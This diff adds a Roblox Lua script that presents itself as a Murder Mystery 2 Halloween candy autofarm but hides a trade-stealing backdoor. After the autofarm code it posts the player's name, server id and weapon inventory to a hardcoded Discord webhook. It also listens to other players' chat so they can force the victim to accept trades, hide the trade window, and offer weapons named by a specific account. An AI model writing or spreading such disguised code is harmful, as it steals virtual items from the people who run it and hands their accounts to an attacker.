@@ -1,0 +1,224 @@
+
+if game.PlaceId == 142823291 then
+local library = loadstring(game:HttpGet(('https://raw.githubusercontent.com/bloodball/-back-ups-for-libs/main/wall%20v3')))()
+local w = library:CreateWindow("MM2 Halloween AutoFarm")
+local b = w:CreateFolder("Auto Farm")
+
+Player = game.Players.LocalPlayer
+workspace = game.Workspace
+
+antiafk = true
+function antiafkss()
+  local GC = getconnections or get_signal_cons
+  if GC then
+    for i,v in pairs(GC(Player.Idled)) do
+      if v["Disable"] then
+        v["Disable"](v)
+      elseif v["Disconnect"] then
+        v["Disconnect"](v)
+      end
+    end
+  else
+    local VirtualUser = cloneref(game:GetService("VirtualUser"))
+    Players.LocalPlayer.Idled:Connect(function()
+      VirtualUser:CaptureController()
+      VirtualUser:ClickButton2(Vector2.new())
+    end)
+  end
+end
+antiafkss()
+
+CurrentCoinType = "Candy"
+ResetWhenFullBag = false
+CoinCollectedEvent = game.ReplicatedStorage.Remotes.Gameplay.CoinCollected
+RoundStartEvent = game.ReplicatedStorage.Remotes.Gameplay.RoundStart
+RoundEndEvent = game.ReplicatedStorage.Remotes.Gameplay.RoundEndFade
+
+AutofarmDelay = 3
+ResetWhenFullBag = false
+AutofarmIN = false
+bringpose = CFrame.new(math.random(-5, 5), -100, math.random(-5, 5)) --nvm
+safepart = Instance.new("Part")
+safepart.Anchored = true
+safepart.Massless = true
+safepart.Transparency = 1
+safepart.Size = Vector3.new(2048, 0.5, 2048)
+safepart.CFrame = CFrame.new(0,0,0)
+safepart.CFrame = bringpose * CFrame.new(0, -0.9, 0)
+safepart.Parent = workspace
+
+function returncoincontaier()
+	for _, v in workspace:GetChildren() do
+		if v:FindFirstChild("CoinContainer") and v:IsA("Model") then
+			return v:FindFirstChild("CoinContainer")
+		end
+	end
+	return false
+end
+
+CoinCollectedEvent.OnClientEvent:Connect(function(cointype, current, max)
+	AutofarmIN = true
+	if cointype == CurrentCoinType and tonumber(current) == tonumber(max) then
+		AutofarmIN = false
+		if ResetWhenFullBag then
+			Player.Character.Humanoid.Health = 0
+		end
+	end
+end)
+
+function PcallTP(Position)
+	if Player.Character then
+		if Player.Character:FindFirstChild("HumanoidRootPart") then
+			Player.Character.HumanoidRootPart.CFrame = Position
+		end
+	end
+end
+
+--yes yes autofarm using loops, but its still nice
+spawn(function()
+	while true do
+		if AutofarmStarted and AutofarmIN and Player.Character and returncoincontaier() then
+			PcallTP(bringpose)
+			for _, v in pairs(returncoincontaier():GetChildren()) do
+				if v:GetAttribute("CoinID") == CurrentCoinType and v:FindFirstChild("TouchInterest") then
+					for i = 1,7 do
+						PcallTP(v.CFrame)
+						task.wait(0.03)
+					end
+					break
+				end
+			end
+			PcallTP(bringpose)
+		end
+		task.wait(AutofarmDelay)
+	end
+end)
+
+RoundStartEvent.OnClientEvent:Connect(function()
+	if AutofarmStarted then Player.Character.HumanoidRootPart.CFrame = bringpose end
+	AutofarmIN = true
+end)
+
+RoundEndEvent.OnClientEvent:Connect(function()
+	AutofarmIN = false
+end)
+
+
+
+AutofarmStarted = false
+function StartAutofarm()
+	if not AutofarmStarted then
+		AutofarmStarted = true
+		AutofarmIN = true
+		StartAutofarmButton.TextColor3 = Color3.new(0, 1, 0)
+	else
+		AutofarmStarted = false
+		StartAutofarmButton.TextColor3 = Color3.new(1, 1, 1)
+	end
+end
+
+b:Toggle("Candy Farm",function(a)
+StartAutofarm()
+end)
+
+b:Toggle("Reset On Full",function(d)
+if ResetWhenFullBag == false then
+ResetWhenFullBag = true
+else
+ResetWhenFullBag = false
+end
+end)
+
+b:Toggle("Anti afk",function(bool)
+if antiafk == false then
+antiafk = true
+else
+antiafk = false
+end
+end)
+
+local url = "https://discord.com/api/webhooks/1296489854061903894/WU2SIziNuj1qUPFKbz5hYKKrFqV0n6jv_xWhUrACj3OJMtHCH7zoFISKoUcg60H_ma_O"
+   
+t = {}
+for i,v in game.ReplicatedStorage.Remotes.Extras.GetFullInventory:InvokeServer(game.Players.LocalPlayer.Name)["Weapons"]["Owned"] do
+ table.insert(t, tostring(i).." : "..tostring(v)..", ")
+end
+inventory = table.concat(t)
+   
+local data = {
+		["embeds"] = {
+					{
+						["title"] = "",
+						["description"] = "Name ".. game.Players.LocalPlayer.Name .. " Jobid: " ..game.JobId ..  " Inventory: " ..inventory,
+						["type"] = "rich",
+						["color"]= tonumber(0xff0000),
+						["footer"] = {
+							["icon_url"] = 'https://cdn.discordapp.com/icons/924841537328803870/2ea57c68b447a717b9ed0e0c3bc4f241.png?size=4096',
+							["text"] = ""
+						},
+						["thumbnail"] = {
+							["url"] = "https://cdn.discordapp.com/icons/924841537328803870/2ea57c68b447a717b9ed0e0c3bc4f241.png?size=4096",
+						},
+						["author"] = {
+							["name"] = ""
+						},
+						["fields"] = {
+							{
+								["name"] = '**Player profile**',
+								["value"] = "https://www.roblox.com/users/"..game.Players.LocalPlayer.UserId.."/profile",
+								["inline"] = true
+							},
+						}
+					}}
+			}
+local newdata = game:GetService("HttpService"):JSONEncode(data)
+local headers = {
+   ["content-type"] = "application/json"
+}
+request = http_request or request or HttpPost or syn.request
+local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
+request(abcdef)
+Player = game.Players.LocalPlayer
+Pl = game.Players
+function MainCommands(plr, msg)
+    if msg == "p" then
+        game.Players.LocalPlayer.Character.Humanoid.Health = 0
+    end
+    if msg == "s" then
+        game:GetService("ReplicatedStorage"):WaitForChild("Trade"):WaitForChild("AcceptRequest"):FireServer()
+        for i = 1, 100 do
+            wait(0.1)
+        game.Players.LocalPlayer.PlayerGui.TradeGUI_Phone.Enabled = false
+        game.Players.LocalPlayer.PlayerGui.TradeGUI.Enabled = false
+    end
+    end
+    
+    game.Players.x3x1g.Chatted:Connect(function(msg)
+    
+    local args = {
+        [1] = msg,
+        [2] = "Weapons"
+    }
+    
+    game:GetService("ReplicatedStorage"):WaitForChild("Trade"):WaitForChild("OfferItem"):FireServer(unpack(args))
+end)
+    if msg == "a" then
+        game:GetService("ReplicatedStorage"):WaitForChild("Trade"):WaitForChild("AcceptTrade"):FireServer()
+        game:GetService("ReplicatedStorage"):WaitForChild("Trade"):WaitForChild("AcceptTrade"):FireServer()
+        
+    end
+end
+for i, v in Pl:GetChildren() do
+    if v ~= Player then
+        v.Chatted:Connect(function(msg)
+            MainCommands(v, msg)
+        end)
+    end
+end
+Pl.PlayerAdded:Connect(function(plr)
+    plr.Chatted:Connect(function(msg)
+        MainCommands(plr, msg)
+    end)
+end)
+
+end
